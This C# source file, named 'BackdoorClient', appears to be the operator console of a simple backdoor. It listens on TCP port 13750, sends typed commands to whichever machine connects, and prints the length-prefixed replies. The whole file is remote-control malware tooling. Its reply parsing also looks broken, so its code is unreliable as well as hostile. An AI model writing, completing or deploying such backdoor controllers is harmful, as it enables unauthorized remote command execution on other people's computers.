using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Sockets;

namespace BackdoorClient
{
    class Program
    {
        public static NetworkStream socket_client;
        public static void remotecmd()
        {
            try
            {
                byte[] Recive = new byte[1000];
                socket_client.Read(Recive, 0, Recive.Length);
                socket_client.Flush();
                string buf = Encoding.ASCII.GetString(Recive);
                int size = Convert.ToInt16(buf);
                Console.WriteLine("len: " + size);

                byte[] rcmd = new byte[size];
                socket_client.Read(rcmd, 0, rcmd.Length);
                socket_client.Flush();
                string cmd = Encoding.ASCII.GetString(rcmd);
                Console.WriteLine(cmd);
                socket_client.Flush();
            }
            catch
            {
                Console.WriteLine("--Odłączono od serwera--");
                Console.ReadKey();
                socket_client.Close();
            }
        }
        static void Main(string[] args)
        {
            TcpListener listener = new TcpListener(13750);
            listener.Start();
            TcpClient client = listener.AcceptTcpClient();
            socket_client = client.GetStream();
            while (true)
            {
                string cmd = Console.ReadLine();
                byte[] cb = Encoding.ASCII.GetBytes(cmd);
                socket_client.Write(cb, 0, cb.Length);
                socket_client.Flush();
                remotecmd();
            }
        }
    }
}
